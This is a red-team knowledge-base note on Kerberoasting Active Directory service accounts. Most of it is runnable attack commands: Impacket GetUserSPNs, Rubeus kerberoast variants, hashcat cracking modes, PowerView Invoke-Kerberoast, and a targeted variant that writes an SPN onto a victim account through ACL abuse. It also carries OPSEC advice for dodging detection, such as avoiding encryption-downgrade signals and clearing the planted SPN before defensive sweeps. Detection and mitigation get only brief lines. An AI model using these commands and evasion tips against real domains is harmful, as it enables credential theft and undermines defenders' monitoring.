---
title: Kerberoasting
aliases: ["Kerberoast", "Kerberoasting"]
type: technique
domain: [red-team]
attack_tactic: [credential-access]
tags: [type/technique, domain/red-team, attack/credential-access, proto/kerberos]
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Service Principal Name (SPN)]]", "[[Kerberos Authentication Flow]]", "[[Kerberos Keys]]", "[[SPN Scanning]]", "[[NTLM Cracking]]", "[[Rubeus]]", "[[PowerView]]", "[[ACL Abuse]]", "[[Unconstrained Delegation]]"]
created: 2026-06-06
updated: 2026-06-07
---

# Kerberoasting

> [!summary] One-liner
> Any domain user can request a service ticket for any SPN; the ticket is encrypted with the service account's key, so crack it offline to recover that account's password.

## Concept abused
In the [[Kerberos Authentication Flow|TGS exchange]], the **ST is encrypted with the service account's key** ([[Kerberos Keys]]). The KDC hands one to **any** authenticated user who asks for the [[Service Principal Name (SPN)|SPN]] — no authorization check.

## Prerequisites
- Any valid domain user.
- Target = a **user account** with an SPN (service account). Machine-account SPNs have random 120-char passwords (uncrackable) — focus on **user** SPNs.

## How the attack works
1. Find accounts with SPNs ([[SPN Scanning]] / LDAP `(servicePrincipalName=*)`).
2. Request STs for them (TGS-REQ).
3. Extract the encrypted ST and **crack offline** to recover the service account password.

## Commands & tools
```bash
# Impacket (from Linux)
GetUserSPNs.py 'contoso.local/user:password' -dc-ip 192.168.0.2 -request -outputfile kerb.hashes
```
```powershell
# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
```
```bash
# Crack (request RC4 etype for easier cracking if AES not enforced)
hashcat -m 13100 kerb.hashes rockyou.txt -r best64.rule
```

## Detection / artifacts
- DC event **4769** (ST request), especially with **RC4 (etype 0x17)** encryption ("encryption downgrade") and bursts of SPN requests from one user.

## Mitigation
- Long/random service-account passwords (25+ chars), **gMSA/dMSA** (managed accounts), enforce AES, monitor 4769.

## More from harmj0y (encryption types & OPSEC — "Kerberoasting Revisited")

### Etypes and what actually controls the returned encryption
Three encryption algorithms are relevant:
- **RC4_HMAC_MD5 (etype 23 / 0x17)** — uses the account's NTLM hash as the key; orders of magnitude faster to crack. Hashcat mode **13100**.
- **AES128_CTS_HMAC_SHA1_96 (etype 17)**.
- **AES256_CTS_HMAC_SHA1_96 (etype 18 / 0x12)** — thousands of times slower to crack than RC4; effectively non-crackable. Hashcat mode **19700** (AES256 TGS-REP).

The attribute **`msDS-SupportedEncryptionTypes`** on the account governs which etype the KDC issues, independent of domain functional level:
- **Computer accounts**: default `0x1C` (RC4 + AES128 + AES256) — KDC picks the **highest** supported type.
- **User accounts**: attribute usually **undefined (0x0)** → defaults to **RC4 only** per MS-KILE 3.3.5.7. This is why plain `KerberosRequestorSecurityToken` requests typically return RC4.
- **Domain trusts**: initially undefined → default RC4.
- [UNVERIFIED] An account explicitly configured AES-only (`msDS-SupportedEncryptionTypes=24`) can still return a crackable RC4 ticket when RC4 is specifically requested, apparently for backwards-compat failsafe reasons. (status/unverified)

### Two general approaches
- **Standalone protocol implementation** (Impacket, Meterpreter): needs domain creds to get a TGT; gives full control over etype negotiation.
- **Host-based Windows functionality**: uses the built-in .NET `KerberosRequestorSecurityToken` class and the current user's existing TGT — no plaintext creds — then extracts tickets with Mimikatz or [[Rubeus]].

### [[Rubeus]] options (OPSEC-aware)
```powershell
# Default: returns highest supported etype (AES256 for AES-enabled accounts -> not crackable)
Rubeus.exe kerberoast

# /tgtdeleg: abuse Kerberos GSS-API delegation (cifs/DC) to obtain a usable TGT, then
# request service tickets specifying RC4 only. Avoids caching one ST per SPN in the
# logon session (host indicator) -- only a single cifs/DC ticket is added.
Rubeus.exe kerberoast /tgtdeleg

# /rc4opsec: filter OUT AES-enabled accounts; only roast accounts that default to RC4,
# so you get crackable RC4 tickets WITHOUT triggering an encryption-downgrade anomaly.
Rubeus.exe kerberoast /rc4opsec

# /aes: only target/return AES tickets (currently non-crackable; recon/inventory use)
Rubeus.exe kerberoast /aes

# Use a supplied TGT blob/.kirbi for the TGS-REQ/TGS-REP manually
Rubeus.exe kerberoast /ticket:<blob or file.kirbi>
```

### OPSEC notes
- The **default** host-based method caches a service ticket per SPN in the user's logon session — a large number of cached STs is a host-based indicator. `/tgtdeleg` avoids this (tickets are not cached on the host).
- Requesting **RC4 in modern AES domains is an anomaly** (encryption-downgrade). Prefer `/rc4opsec` to target accounts that natively default to RC4, so no downgrade signal is produced.
- Sean Metcalf's DC-log analysis can flag downgrade activity, but **false positives are likely** because many user accounts legitimately default to RC4.

## More from harmj0y (Targeted Kerberoasting via ACL abuse)

If you hold **GenericWrite / GenericAll** over a target user object ([[ACL Abuse]]), you can roast it without a destructive password reset: temporarily set an SPN on the account, request a ticket, crack offline, then remove the SPN.

```powershell
# 1. Check current SPN (so you can restore state)
Get-DomainUser victimuser | Select serviceprincipalname

# 2. Set an arbitrary SPN on the target (requires GenericWrite/GenericAll)
Set-DomainObject -Identity victimuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

# 3. Request & extract the TGS hash
$User = Get-DomainUser victimuser
$User | Get-DomainSPNTicket | fl

# 4. Restore: clear the SPN so it doesn't linger for defensive sweeps
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```
- **OPSEC**: the SPN is removed afterward, so it won't be caught by defensive SPN sweeping — but object-modification auditing (write to `servicePrincipalName`) can still detect the change.
- **Limitations**: target still needs a crackable password; if you're already Domain Admin, [[DCSync]] is a cleaner way to get plaintext/hashes.

## More from harmj0y (Kerberoasting without Mimikatz — pure PowerShell/.NET)

The .NET class **`System.IdentityModel.Tokens.KerberosRequestorSecurityToken`** requests a service ticket; its **`GetRequest()`** method returns the **raw byte stream** of the Kerberos ST. By doing bit-string manipulation on `GetRequest()` output to isolate the encrypted component, you produce a crackable hash **without** `kerberos::list /export` in Mimikatz.

```powershell
# Minimal request of a service ticket via .NET (no Mimikatz needed)
Add-Type -AssemblyName System.IdentityModel
$Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/SQL.testlab.local'
```

**PowerView `Invoke-Kerberoast` / `Get-DomainSPNTicket` (a.k.a. Request-SPNTicket)**:
- Enumerate domain users with a non-null `servicePrincipalName`, request a TGS per SPN, and emit crackable hashes.
- Output formats: **John the Ripper** (default) and **Hashcat** (`-OutputFormat Hashcat`).
- JtR hash shape: `$krb5tgs$23$*user$realm$spn*$<hash_data>` (etype 23 = RC4).
- Crack with Hashcat mode **13100** (Kerberos 5 TGS-REP etype 23).

```powershell
# Roast everything roastable, Hashcat-formatted
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

## Related
- Targeting: [[SPN Scanning]]; cracking: [[NTLM Cracking]] toolchain (mode 13100 RC4 / 19700 AES256).
- Tools: [[Rubeus]], [[PowerView]]. Targeted variant relies on [[ACL Abuse]]; `/tgtdeleg` relates to [[Unconstrained Delegation]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Kerberoast"
- [[Source - harmj0y blog]] — "Kerberoasting Revisited" — https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
- [[Source - harmj0y blog]] — "Targeted Kerberoasting" — https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/
- [[Source - harmj0y blog]] — "Kerberoasting Without Mimikatz" — https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/
